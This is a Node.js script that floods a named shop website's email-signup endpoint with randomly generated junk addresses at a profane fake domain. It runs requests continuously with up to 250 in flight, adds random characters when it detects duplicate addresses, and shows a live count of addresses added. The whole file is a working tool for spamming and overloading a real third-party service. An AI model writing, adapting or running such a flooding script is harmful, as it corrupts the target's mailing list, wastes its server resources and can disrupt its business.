const readline = require("readline");
const request = require("request");
const randomstring = require("randomstring");
const format = require("string-format");

format.extend(String.prototype, {});

let activeCount = 0;
let emailsAdded = 0;

let extraEntropy = 0;

function genopts(email) {
    return {
        url: "http://www.devilsteamproshop.com/ajaxProcess.php",
        form: {
            "email": email,
            "enter": "" // Why is this here? *Why not?*
        }
    };
}

function sendReq() {

    return new Promise(resolve => {
        let email = "{0}@fuckyou{1}.net".format(randomstring.generate(8 + extraEntropy), randomstring.generate(4));

        request.post(genopts(email), function (err, httpResponse) {
            if (err) {resolve(false); return;}

            // Don't report it was added if we get an error or it was already in the database
            if (httpResponse.statusCode == 200 && !httpResponse.body.startsWith("Your email")) {
                resolve(email);
            } else {
                if (httpResponse.body.startsWith("Your email")) { // Sent in body if email was already in database
                    extraEntropy++; // Add more random characters if we start reusing emails
                }
                resolve(false);
            }
        });
    });
}

async function myfunction() {
    
    if (activeCount >= 250) { // Avoid a memory leak caused by making new requests faster than we get responses
        return;
    }
    

    activeCount++;

    let email = await sendReq().catch(function (err) {
        console.error(err);
    });

    activeCount--;

    if (email) {
        emailsAdded++;
    }

}


// myfunction();
setInterval(myfunction, 0); // Weird quirk, don't use a while true

setInterval(function () {
    readline.clearLine(process.stdout);
    readline.cursorTo(process.stdout, 0);
    process.stdout.write("{0} emails added; {1} MB memory in use; {2} requests out".format(emailsAdded , Math.round((process.memoryUsage().heapTotal / 1024 / 1024 * 100) / 100), activeCount));
}, 20);

if (global.gc) {
    setInterval(global.gc, 30000); // Force garbage collection every 30 seconds
}
